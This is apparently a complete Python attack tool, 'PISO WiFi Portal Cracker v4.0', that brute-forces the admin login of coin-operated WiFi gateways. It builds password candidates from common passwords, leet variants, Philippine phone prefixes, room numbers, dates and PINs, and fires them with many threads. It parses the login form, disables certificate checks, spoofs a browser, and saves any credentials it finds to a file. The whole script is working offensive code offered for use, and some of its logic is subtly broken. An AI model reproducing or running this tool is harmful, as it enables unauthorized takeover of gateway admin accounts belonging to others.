#!/usr/bin/env python3
"""
PISO WiFi Portal Cracker v4.0 — Optimized Speed Engine
Target : http://10.0.0.1/admin  (Tenda/Ox/CoovaChilli PISO Gateway)
Speed  : Zero allocation iterators, C-accelerated charset, no storage bloat
Modes  : dict+leet+mask hybrid | pure mask numeric | alphanumeric brute
"""

import argparse, itertools, os, queue, re, signal, ssl, sys, threading, time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, parse_qs, urlencode

import requests
import queue
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ═══════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════
GATEWAY      = "http://10.0.0.1"
LOGIN_PATH   = "/admin"          # PISO default admin path
TARGET_URL   = GATEWAY + LOGIN_PATH
DEFAULT_THREADS = 64
TIMEOUT      = 6
MAX_QUEUE    = 20000

# ═══════════════════════════════════════════════════════
#  ANSI BANNER
# ═══════════════════════════════════════════════════════
ESC = "\x1b["
R  = f"{ESC}91m"; G = f"{ESC}92m"; Y = f"{ESC}93m"; B = f"{ESC}94m"
C = f"{ESC}96m"; W = f"{ESC}97m"; K = f"{ESC}90m"; BLD = f"{ESC}1m"
rst = f"{ESC}0m"; clrline = f"{ESC}2K\r"

BANNER = f"""
{BLD}{C}  ██████╗ ███████╗███████╗██╗   ██╗███╗   ███╗███████╗{rst}
{BLD}{C}  ██╔══██╗██╔════╝██╔════╝██║   ██║████╗ ████║██╔════╝{rst}
{BLD}{C}  ██║  ██║█████╗  ███████╗██║   ██║██╔████╔██║█████╗  {rst}
{BLD}{C}  ██║  ██║██╔══╝  ╚════██║██║   ██║██║╚██╔╝██║██╔══╝  {rst}
{BLD}{C}  ██████╔╝███████╗███████║╚██████╔╝██║ ╚═╝ ██║███████╗{rst}
{BLD}{C}  ╚═════╝ ╚══════╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝{rst}
{BLD}{Y}     PISO WiFi PORTAL CRACKER {W}v4.0{rst}  {K}:: {C}TARGET:{W} 10.0.0.1/admin{K} ::{Y} ENGINE:SPEED+{rst}
"""

def clear(): os.system('clear' if os.name=='posix' else 'cls')

def banner():
    clear()
    print(BANNER)
    print(f"  {K}[{C}*{K}]{W} CPU Cores  : {Y}{os.cpu_count()}{rst}")
    print(f"  {K}[{C}*{K}]{W} Max Threads : {Y}{args.threads}{rst}")
    print(f"  {K}[{C}*{K}]{W} Mode        : {Y}HYBRID (dict+leet+mask+rules){rst}")
    print(f"  {K}[{C}*{K}]{W} Target      : {Y}{TARGET_URL}{rst}")
    print()

# ═══════════════════════════════════════════════════════
#  CHARSET SYSTEM — zero-allocation iterators
# ═══════════════════════════════════════════════════════
LOWER   = "abcdefghijklmnopqrstuvwxyz"
UPPER   = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
DIGITS  = "0123456789"
SPECIAL = "!@#$%^&*()-_=+[]{}|;:,.<>?/"
LEET_MAP = str.maketrans("aeioslthAEIOSTH","43105+7h431057H")

# PISO-specific patterns (room numbers, phone prefixes, dates)
PISO_PHONE_PREFS = ("0917","0918","0919","0920","0921","0922","0923","0925",
                    "0930","0935","0938","0945","0946","0947","0948","0949",
                    "0950","0951","0952","0953","0954","0955","0956","0957",
                    "0958","0960","0961","0962","0965","0966","0967","0968",
                    "0969","0970","0971","0975","0977","0978","0979","0981",
                    "0990","0991","0992","0993","0994","0995","0996","0997",
                    "0998","0999","6390","6391","6392","6393","6394","6395",
                    "6396","6397","6398","6399","09","63")
PISO_ROOM_PREFS  = ("10","11","12","13","14","15","20","21","22","23","24",
                    "25","30","31","32","33","34","35","40","50","60","70",
                    "80","90","100","101","102","103","104","105","106","107")
PISO_DATES      = [f"{y}{m:02d}{d:02d}" for y in range(1990,2027)
                   for m in range(1,13) for d in range(1,32)]
PISO_YEARS      = [str(y) for y in range(1990,2027)]
PISO_COMMON     = [
    "admin","password","12345678","123456789","qwertyuiop","12345qwert",
    "1234567890","password1","iloveyou","princess","dragon","football",
    "baseball","superman","trustno1","letmein","monkey","shadow","master",
    "hello","freedom","whatever","qazwsx","123qweasd","asdfghjkl","zxcvbnm",
    "internet","starwars","login","changeme","default","guest","user","test",
    "temp","secret","wifi","router","piso","hotspot","connect","access",
    "welcome","public","open","free","guest123","admin123","root","toor",
    "pass","pw","pwd","111111","000000","121212","696969","888888","999999",
    "abcdef","abc123","aaaaaa","123123","123321","qwerty","asdf","zxcv",
    "qwer","asdzxc","pass123","pass1234","adminpass","user123","user1234",
    "piso123","piso1234","piso2024","piso2025","piso12345","piso54321",
    "room","room123","desk","desk123","office","office123","store","store123",
    "lobby","lobby123","main","main123","manager","manager123","server",
    "server123","test123","setup","setup123","config","config123",
    "0123456","01234567","012345678","987654321","98765432","87654321",
    "7654321","654321","54321","4321","321","21","1",
    "aaaa","aaab","aaac","aabb","aabc","abab","abcd","abca","abcb",
    "a1b2c3","a1b2c3d4","1a2b3c","1a2b3c4","abcd1234","ABCD1234",
    "PASSWORD","Password","PASSWORD1","Password1","Admin123","Admin1234",
]

# ═══════════════════════════════════════════════════════
#  CANDIDATE GENERATORS — memory-efficient iterators
# ═══════════════════════════════════════════════════════
def gen_dict_leet():
    """Dictionary words with leet + case + year + special transforms. Yields as it goes."""
    seen = set()
    for w in PISO_COMMON:
        # base
        if w not in seen: yield w; seen.add(w)
        # leet
        lw = w.translate(LEET_MAP)
        if lw not in seen: yield lw; seen.add(lw)
        # swap case
        sw = w.swapcase()
        if sw not in seen: yield sw; seen.add(sw)
        # year append/prepend
        for y in PISO_YEARS:
            for combo in (w+y, y+w, w.lower()+y, w.upper()+y):
                if combo not in seen: yield combo; seen.add(combo)
        # special suffix/prefix
        for s in "!@#$%&*":
            for combo in (w+s, s+w, w.lower()+s, w.upper()+s):
                if combo not in seen: yield combo; seen.add(combo)

def gen_phone_numbers():
    """Philippine phone number patterns."""
    for pref in PISO_PHONE_PREFS:
        # 4-digit suffix combos (0000-9999) — yield in chunks
        for suffix in (f"{i:04d}" for i in range(10000)):
            yield pref + suffix
        # also 7-digit full number
        yield pref + "0000000"
        yield pref + "1111111"
        yield pref + "1234567"
        yield pref + "9999999"

def gen_numeric(length=6, max_len=8):
    """Pure numeric PINs 4–max_len digits. Yields on the fly, no list."""
    for l in range(length, max_len+1):
        for combo in itertools.product(DIGITS, repeat=l):
            yield "".join(combo)

def gen_alphanumeric(min_len=4, max_len=8):
    """Mixed alpha+numeric combos. Very large — use mask mode instead."""
    charset = LOWER + DIGITS
    for l in range(min_len, max_len+1):
        cnt = 0
        for combo in itertools.product(charset, repeat=l):
            yield "".join(combo)
            cnt += 1
            if l >= 6 and cnt > 200000: break  # cap per length to stay sane

def gen_mask_chunks(mask):
    """Mask expand: ?l ?u ?d ?s ?a — e.g. Pass?d?d?d → Pass000 … Pass999."""
    sets = {
        'l': LOWER, 'u': UPPER, 'd': DIGITS, 's': SPECIAL,
        'a': LOWER+UPPER+DIGITS+SPECIAL
    }
    # Parse mask char-by-char: ?X = charset slot, other = literal char list
    slots = []
    i = 0
    while i < len(mask):
        if mask[i] == '?' and i+1 < len(mask) and mask[i+1] in sets:
            slots.append(sets[mask[i+1]])
            i += 2
        else:
            slots.append([mask[i]])
            i += 1
    def walk(pos, acc):
        if pos == len(slots):
            yield acc
            return
        for ch in slots[pos]:
            yield from walk(pos+1, acc+ch)
    yield from walk(0, "")

def gen_piso_pin_patterns():
    """PISO-specific high-value patterns."""
    # Room + 4-digit
    for r in PISO_ROOM_PREFS:
        for s in (f"{i:04d}" for i in range(10000)):
            yield r + s
    # Dates
    yield from PISO_DATES
    # Repeating digits
    for d in DIGITS:
        for l in range(1, 9):
            yield d * l
    # Stepping patterns
    for start in range(10):
        yield "".join(str((start+i)%10) for i in range(8))
    # 6-digit rolling
    for i in range(1000000):
        yield f"{i:06d}"

# ═══════════════════════════════════════════════════════
#  HYBRID CANDIDATE STREAM — feeds workers without storing all
# ═══════════════════════════════════════════════════════
def build_stream(args):
    """Chain generators into a single queue-fed stream."""
    streams = []
    # Dict + leet always
    streams.append(gen_dict_leet())

    if args.mode in ("hybrid","mask"):
        if args.pin_only:
            streams.append(gen_numeric(4, 8))
        else:
            streams.append(gen_piso_pin_patterns())
            streams.append(gen_numeric(4, 8))
            streams.append(gen_alphanumeric(4, 6))

    if args.mode == "mask" and args.mask:
        streams.append(gen_mask_chunks(args.mask))

    return itertools.chain.from_iterable(streams)

# ═══════════════════════════════════════════════════════
#  NETWORK ENGINE
# ═══════════════════════════════════════════════════════
def make_session():
    s = requests.Session()
    s.verify = False
    sTrust = False
    try:
        import urllib3; urllib3.disable_warnings()
    except: pass
    retry = Retry(total=2, backoff_factor=0.2, status_forcelist={500,502,503,504})
    adapter = HTTPAdapter(max_retries=retry, pool_connections=128, pool_maxsize=256)
    s.mount("http://", adapter)
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": TARGET_URL,
    })
    return s

# Success markers per vendor
POSITIVE = re.compile(
    r"(?:welcome|success|authenticated|logout|sign.?out|session|"
    r"connected|online|grant|access.?granted|redirect|dashboard|"
    r"欢迎|登录成功|已连接|已认证|欢迎使用)", re.I
)
NEGATIVE = re.compile(
    r"(?:invalid|incorrect|wrong|fail|denied|error|try.?again|"
    r"bad.?credentials|unauthorized|not.?found|locked|timeout|"
    r"错误|失败|不正确|拒绝)", re.I
)

def detect_form(sess, url):
    """Parse login form: action URL, field names, method, hidden tokens."""
    r = sess.get(url, timeout=TIMEOUT)
    html = r.text

    # Form action
    m = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.I)
    action = m.group(1) if m else url
    if not action.startswith("http"):
        p = urlparse(url)
        action = f"{p.scheme}://{p.netloc}{action if action.startswith('/') else '/'+action}"

    # Method
    m2 = re.search(r'<form[^>]+method=["\']([^"\']+)["\']', html, re.I)
    method = (m2.group(1).upper() if m2 else "POST")

    # Inputs — name + type + default value
    inputs = {}
    for im in re.finditer(
        r'<input[^>]*name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?[^>]*>',
        html, re.I
    ):
        name = im.group(1)
        typ  = (re.search(r'type=["\']([^"\']+)["\']', im.group(0)) or type('',(object,),{'group':lambda s,i:''})).group(1) or 'text'
        val  = im.group(2) or ''
        inputs[name] = {"type": typ.lower(), "default": val}

    return {
        "action": action, "method": method,
        "inputs": inputs, "html_len": len(html), "final_url": r.url
    }

def try_login(sess, info, user, pwd):
    """Submit one credential pair, return (bool success, str reason, int code)."""
    # Build payload — fill username + password fields, pass through hidden tokens
    payload = {}
    user_field = pass_field = None
    for fname, finfo in info["inputs"].items():
        t = finfo["type"]
        if t in ("hidden","submit","button","image","reset"): continue
        nl = fname.lower()
        if not user_field   and any(k in nl for k in ("user","name","login","acct","id","uname","email","mobile","phone")):
            user_field = fname
        if not pass_field   and any(k in nl for k in ("pass","pwd","key","secret","pin","code","otp")):
            pass_field = fname
        if t not in ("text","password","number","tel","email","search"):
            continue
        # fill user/pass below, keep hidden defaults as-is
        if t == "hidden":
            payload[fname] = finfo["default"]

    # Override user/pass fields
    if user_field:   payload[user_field]   = user
    else:            payload[list(info["inputs"].keys())[0] if info["inputs"] else "username"] = user
    if pass_field:   payload[pass_field]   = pwd
    else:            payload[list(info["inputs"].keys())[1] if len(info["inputs"]) > 1 else "password"] = pwd

    try:
        if info["method"] == "GET":
            r = sess.get(info["action"], params=payload, timeout=TIMEOUT, allow_redirects=True)
        else:
            r = sess.post(info["action"], data=payload, timeout=TIMEOUT, allow_redirects=True)

        txt = r.text.lower()
        code = r.status_code

        # Redirect = strong success signal
        if code in (301,302,303,307,308):
            loc = r.headers.get("Location","")
            # If redirected away from login page, it's success
            if info["action"] not in loc and loc != "":
                return True, "302-redirect-away-from-login", code

        # Keyword scoring
        pos_matches = POSITIVE.findall(txt)
        neg_matches = NEGATIVE.findall(txt)

        if neg_matches and not pos_matches:
            return False, f"fail-keyword:{neg_matches[0]}", code
        if pos_matches:
            return True, f"success-keyword:{pos_matches[0]}", code

        # Content-length delta heuristic (portal responded differently)
        dl = abs(len(r.text) - info["html_len"])
        if dl > 500 and "input" not in txt[:500]:
            return True, f"content-shift:{dl}", code

        return False, "no-signal", code

    except requests.exceptions.RequestException as e:
        return False, f"net-error:{type(e).__name__}", 0

# ═══════════════════════════════════════════════════════
#  WORKER
# ═══════════════════════════════════════════════════════
class CrackerState:
    def __init__(self, info, user, results, stop_evt):
        self.info = info; self.user = user
        self.results = results; self.stop_evt = stop_evt
        self.lock = threading.Lock()
        self.tried = [0]; self.hits = []

    def worker(self, cred_q):
        sess = make_session()
        while not self.stop_evt.is_set():
            try:
                pwd = cred_q.get(timeout=0.5)
            except queue.Empty:
                continue

            ok, reason, code = try_login(sess, self.info, self.user, pwd)
            with self.lock:
                self.tried[0] += 1
                n = self.tried[0]
                if n % 200 == 0:
                    print(f"{clrline}{K}[{Y}i{K}]{W} tested {C}{n}{W} creds", end="", flush=True)
                if ok:
                    self.hits.append((self.user, pwd, reason, code))
                    self.results.append((self.user, pwd, reason, code))
                    print(f"\n{K}[{G}!!! HIT{K}]{W} {G}{self.user}{W}:{G}{pwd}{W}  {K}({reason}, HTTP {code}){rst}")
                    if args.stop:
                        self.stop_evt.set()
                        print(f"{K}[{Y}!{K}]{W} Stopping — first hit found{rst}")
        sess.close()

# ═══════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════
def main():
    global args
    parser = argparse.ArgumentParser(description="PISO WiFi Portal Cracker v4.0", formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--url",    default=TARGET_URL, help="Full login URL")
    parser.add_argument("--user",   default="admin",    help="Username (default: admin)")
    parser.add_argument("--threads",type=int, default=DEFAULT_THREADS, help=f"Threads (default: {DEFAULT_THREADS})")
    parser.add_argument("--mode",   choices=["hybrid","dict","mask","pin"], default="hybrid",
                        help="Generation mode: hybrid (all), dict (leet only), mask (mask only), pin (numeric only)")
    parser.add_argument("--mask",   default=None,       help="Mask pattern: ?l?u?d?s?a e.g. Pass?d?d?d")
    parser.add_argument("--pin-only",action="store_true",help="Numeric PINs only (4–8 digits)")
    parser.add_argument("--stop",   action="store_true", help="Stop on first valid credential")
    parser.add_argument("--timeout",type=int, default=TIMEOUT)
    parser.add_argument("--no-banner",action="store_true")
    args = parser.parse_args()

    if not args.no_banner:
        banner()

    # Probe portal
    print(f"{K}[{C}*{K}]{W} Probing {Y}{args.url}{W}…", end=" ", flush=True)
    try:
        sess = make_session()
        info = detect_form(sess, args.url)
        fields = [k for k,v in info["inputs"].items() if v["type"] not in ("hidden","submit","button")]
        print(f"{G}OK{rst}")
        print(f"  {K}→{W} Action  : {C}{info['action']}{rst}")
        print(f"  {K}→{W} Method  : {C}{info['method']}{rst}")
        print(f"  {K}→{W} Fields  : {C}{fields}{rst}")
        sess.close()
    except Exception as e:
        print(f"{R}FAIL{rst} — {e}")
        sys.exit(1)

    # Results
    results = []
    stop_evt = threading.Event()
    cred_q = queue.Queue(maxsize=MAX_QUEUE)

    state = CrackerState(info, args.user, results, stop_evt)

    # Start workers
    workers = [threading.Thread(target=state.worker, args=(cred_q,), daemon=True) for _ in range(args.threads)]
    for w in workers: w.start()

    # Feed queue from generators
    print(f"{K}[{C}*{K}]{W} Generating candidates… {K}(mode={Y}{args.mode}{K}){rst}")
    gen_start = time.time()
    batch = []
    BATCH_SIZE = 5000

    for pwd in build_stream(args):
        if stop_evt.is_set(): break
        batch.append(pwd)
        if len(batch) >= BATCH_SIZE:
            for p in batch:
                if stop_evt.is_set(): break
                cred_q.put(p)
            sent = len(batch)
            batch = []
            el = time.time() - gen_start
            rate = sent / el if el > 0.01 else 0
            print(f"{clrline}{K}[{C}i{K}]{W} generated {C}{sent}{W} | {Y}{rate:.0f}{W} gen/s", end="", flush=True)

    # flush remainder
    for p in batch:
        if stop_evt.is_set(): break
        cred_q.put(p)

    print(f"\n{K}[{C}*{K}]{W} Generation done. Waiting for workers to drain…{rst}")
    cred_q.join()  # block until queue empty
    stop_evt.set()
    for w in workers: w.join(timeout=5)

    total = state.tried[0]
    elapsed = time.time() - gen_start

    print(f"\n{K}─{rst}"*40)
    print(f"  {K}Tested : {C}{total}{W} credentials{W}")
    print(f"  {K}Hits   : {G if results else R}{len(results)}{W}")
    print(f"  {K}Time   : {Y}{elapsed:.1f}s{W}")
    print(f"  {K}Rate   : {Y}{total/elapsed:.0f}{W} attempts/sec{W}")
    print(f"{K}─{rst}"*40)

    if results:
        out = "found_credentials.txt"
        with open(out,"a") as f:
            for u,p,reason,code in results:
                line = f"{u}:{p}\t{reason}\tHTTP{code}\n"
                f.write(line)
        print(f"\n{K}[{G}!{K}]{W} Credentials saved → {Y}{out}{rst}")
        for u,p,reason,code in results:
            print(f"  {G}{u}:{p}{W}  ({reason}, HTTP {code})")
    else:
        print(f"\n{K}[{R}!{K}]{W} No credentials found.{rst}")
        print(f"  {K}Tips:{W}")
        print(f"  {K}  →{W} Try {Y}--user guest{W} or {Y}--user 1234567890{W}")
        print(f"  {K}  →{W} Try {Y}--mode pin{W} for numeric-only (4–8 digit)")
        print(f"  {K}  →{W} Check if portal uses MAC binding: look for 'mac' field in form")
        print(f"  {K}  →{W} Some PISO need username=room number, password=PIN")

if __name__ == "__main__":
    args = None
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{K}[{R}!{K}]{W} Interrupted.{rst}")
        sys.exit(0)